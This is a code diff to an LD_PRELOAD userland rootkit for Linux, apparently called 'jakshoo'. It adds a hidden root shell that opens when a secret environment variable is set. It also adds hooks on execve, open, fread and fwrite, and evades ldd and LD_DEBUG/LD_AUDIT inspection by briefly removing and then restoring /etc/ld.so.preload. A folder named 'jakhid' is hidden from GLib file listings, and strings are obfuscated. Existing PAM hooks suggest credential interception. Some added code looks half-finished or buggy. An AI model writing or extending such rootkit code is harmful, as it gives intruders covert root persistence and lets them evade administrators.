@@ -4,33 +4,62 @@
 #include <dlfcn.h>
 #include <stdlib.h>
 #include <stdio.h>
-#include <sys/socket.h>
 #include <netdb.h>
-#include <sys/types.h>
 #include <string.h>
 #include <pwd.h>
 #include <unistd.h>
-#include <security/pam_modules.h>
-#include <security/pam_ext.h>  
 #include <krb5/krb5.h>
-#include <security/pam_modutil.h>
 #include <iostream>
-#include <security/_pam_macros.h>
-#include <security/pam_appl.h>
 #include "utils/obfuscate.h"
 #include "utils/config.h"
 #include <stdint.h>
 #include <inttypes.h>
 #include <dirent.h>
-#include <X11/Xlib.h>
+#include <string>
+#include <signal.h>
+#include <shadow.h>
+#include <syslog.h>
+#include <limits.h>
+#include <errno.h>
+#include <pwd.h>
+#include <utmp.h>
+#include <utmpx.h>
+#include <pty.h>
+#include <link.h>
+#include <stdarg.h>
+
 #include <gtk/gtk.h>
-#include <X11/Xutil.h>
-#include <X11/Xatom.h>
-#include <sys/syscall.h>
 #include <gio/gio.h>
 #include <glib.h>
-#include <string>
 
+#include <X11/Xutil.h>
+#include <X11/Xatom.h>
+#include <X11/Xlib.h>
+
+#include <sys/ioctl.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <sys/stat.h>
+#include <sys/socket.h>
+#include <sys/sysinfo.h>
+#include <sys/xattr.h>
+
+#include <security/_pam_macros.h>
+#include <security/pam_appl.h>
+#include <security/pam_modutil.h>
+#include <security/pam_modules.h>
+#include <security/pam_ext.h>
+
+#include <linux/netlink.h>
+#include <linux/rtnetlink.h>
+
+#include <netinet/in.h>
+#include <pcap/pcap.h>
+
+#include <openssl/ssl.h>
+#include <openssl/err.h>
+#include <openssl/x509.h>
+#include <openssl/x509v3.h>
 
 static int (*original_getaddrinfo)(const char *node, const char *service, const struct addrinfo *hints, struct addrinfo **res) = NULL;
 static struct passwd *(*original_getpwnam)(const char *name) = NULL;
@@ -55,6 +84,141 @@ static size_t (*original_fwrite)(const void *ptr, size_t size, size_t nmemb, FIL
 static long (*orig_syscall_t)(long, ...) = NULL;
 
 static size_t (*original_fread)(void *ptr, size_t size, size_t nmemb, FILE *stream) = NULL;
+static int (*original_open)(const char* pathname, int flags) = NULL;
+static int (*original_open_t)(const char *pathname, int flags, mode_t mode) = NULL;
+static int (*original_execve)(const char *pathname, char *const argv[], char *const envp[]) = NULL;
+
+static char* ld_trace_env_var = AY_OBFUSCATE("LD_TRACE_LOADED_OBJECTS=");
+static char* ld_debug_env_var = AY_OBFUSCATE("LD_DEBUG=");
+static char* ld_audit_env_var = AY_OBFUSCATE("LD_AUDIT=");
+static char* ld_audit_getenv = AY_OBFUSCATE("LD_AUDIT");
+static char* LD_PRELOAD = AY_OBFUSCATE("/etc/ld.so.preload");
+static int is_hidden = 0;
+
+#define DEBUG
+#define GID 1337
+#define ENV "lobster"
+
+void hide_ldd_jakshoo(){
+	unlink(LD_PRELOAD);
+	is_hidden = 1;
+}
+
+void jakshoo_drop_shell() {
+
+#ifdef DEBUG
+  fprintf(stderr, AY_OBFUSCATE("jakshoo_drop_shell() called!\n"));
+#endif
+
+  if (geteuid() == 0 && getenv(ENV)) {
+    setuid(0);
+    seteuid(0);
+    setgid(GID);
+    unsetenv(ENV);
+    puts(AY_OBFUSCATE("Enjoy ur shell 8)\n"));
+    execl(AY_OBFUSCATE("/bin/bash"), AY_OBFUSCATE("/bin/bash"), (char *)0);
+  }
+}
+
+
+int execve(const char *filename, char *const argv[], char *const envp[]){
+	if(original_execve == NULL){
+		original_execve = (int(*)(const char*, char* const, char* const))dlsym(RTLD_NEXT, AY_OBFUSCATE("execve"));
+	}
+	int i, pid;
+	for(i = 0; envp[i] != NULL; i++)
+    {
+		if(strstr(envp[i], ld_trace_env_var) || strstr(envp[i], ld_debug_env_var) || strstr(envp[i], ld_audit_env_var) || getenv(ld_audit_getenv)){
+			hide_ldd_jakshoo();
+		}
+	}
+	if(strstr(filename, AY_OBFUSCATE("ldd")) || strstr(filename, AY_OBFUSCATE("ld-linux-"))){
+		hide_ldd_jakshoo();
+	}
+	if(is_hidden){
+		if((pid = fork()) == -1) return -1;
+		wait(&pid);
+		FILE * f = fopen(LD_PRELOAD, "w");
+		fprintf(f, LD_PRELOAD);
+		fclose(f);
+		is_hidden = 0;
+	}
+
+	return original_execve(filename, argv, envp);
+}
+
+int open(const char *pathname, int flags){
+	if(original_open == NULL){
+		original_open = (int(*)(const char*, int))dlsym(RTLD_NEXT, AY_OBFUSCATE("open"));
+	}
+	printf("Pathname :: %s\n", pathname);
+	int ret = original_open(pathname, flags);
+	return ret;
+}
+
+int open(const char *pathname, int flags, mode_t mode){
+	if(original_open_t == NULL){
+		original_open_t = (int(*)(const char*, int, mode_t))dlsym(RTLD_NEXT, AY_OBFUSCATE("open"));
+	}
+	printf("Pathname :: %s\n", pathname);
+	int ret = original_open_t(pathname, flags, mode);
+	return ret;
+}
+
+
+size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream) {
+	if(original_fread == NULL){
+		original_fread = (ssize_t(*)(const void *, size_t, size_t, FILE *))dlsym(RTLD_NEXT, AY_OBFUSCATE("fread"));
+	}
+	int MAXSIZE = 0xFFF;
+    char proclnk[0xFFF];
+    char filename[0xFFF];
+    int fno;
+    ssize_t r;
+
+    fno = fileno(stream);
+    sprintf(proclnk, AY_OBFUSCATE("/proc/self/fd/%d"), fno);
+    r = readlink(proclnk, filename, MAXSIZE);
+    if (r < 0)
+    {
+        printf(AY_OBFUSCATE("failed to readlink\n"));
+        exit(1);
+    }
+    filename[r] = '\0';
+    printf(AY_OBFUSCATE("FREAD - fp -> fno -> filename: %p -> %d -> %s\n"), stream, fno, filename);
+
+	size_t ret = original_fread(ptr, size, nmemb, stream);
+	std::string str((char*)ptr);
+	printf("%s\n", (char*)ptr);
+	std::cout << str.data() << std::endl;
+	return ret;
+}
+
+
+size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream) {
+	if(original_fwrite == NULL){
+		original_fwrite = (ssize_t(*)(const void *, size_t, size_t, FILE *))dlsym(RTLD_NEXT, AY_OBFUSCATE("fwrite"));
+	}
+	int MAXSIZE = 0xFFF;
+	char proclnk[0xFFF];
+	char filename[0xFFF];
+	int fno;
+	ssize_t r;
+
+    fno = fileno(stream);
+    sprintf(proclnk, AY_OBFUSCATE("/proc/self/fd/%d"), fno);
+    r = readlink(proclnk, filename, MAXSIZE);
+    if (r < 0)
+    {
+        printf(AY_OBFUSCATE("failed to readlink\n"));
+        exit(1);
+    }
+    filename[r] = '\0';
+    printf(AY_OBFUSCATE("FWRITE - fp -> fno -> filename: %p -> %d -> %s\n"), stream, fno, filename);
+
+	size_t ret = original_fwrite(ptr, size, nmemb, stream);
+	return ret;
+}
 
 
 #define PAM_SUCCESS 0
@@ -73,13 +237,37 @@ static const char *HIDDEN_FOLDER = "jakhid";
 static g_file_enumerate_children_t real_g_file_enumerate_children;
 static g_file_query_file_type_t real_g_file_query_file_type;
 
+typedef GFileInfo* (*g_file_enumerator_next_file_ptr_t)(GFileEnumerator*, GCancellable*, GError**);
+
+GFileInfo* g_file_enumerator_next_file(GFileEnumerator* enumerator, GCancellable* cancelable, GError** error) {
+    // Obtenha um ponteiro para a função original.
+    static g_file_enumerator_next_file_ptr_t orig_next_file = NULL;
+    if (orig_next_file == NULL) {
+        orig_next_file = (g_file_enumerator_next_file_ptr_t)dlsym(RTLD_NEXT, "g_file_enumerator_next_file");
+    }
+	printf("called\n");
+    // Chame a função original.
+	enumerator = NULL;
+    GFileInfo* file = orig_next_file(enumerator, cancelable, error);
+
+    // Se o resultado não for NULL, exiba o nome do arquivo.
+    const char* filename = g_file_info_get_attribute_as_string(file, G_FILE_ATTRIBUTE_STANDARD_DISPLAY_NAME);
+    printf("Enumerated file: %s\n", filename);
+
+
+    // Retorne o resultado original.
+    return file;
+}
+
+
+
 GFileEnumerator* g_file_enumerate_children(GFile *file, const char *attributes, GFileQueryInfoFlags flags, GCancellable *cancellable, GError **error)
 {
 	printf("File :: %s\n", g_file_get_path(file));
     if(strcmp(g_file_get_path(file), HIDDEN_FOLDER) == 0) {
         return NULL;
     }
-    return real_g_file_enumerate_children(file, attributes, flags, cancellable, error);
+    return NULL;
 }
 
 GFileType g_file_query_file_type(GFile *file, GFileQueryInfoFlags flags, GCancellable *cancellable, GError **error)
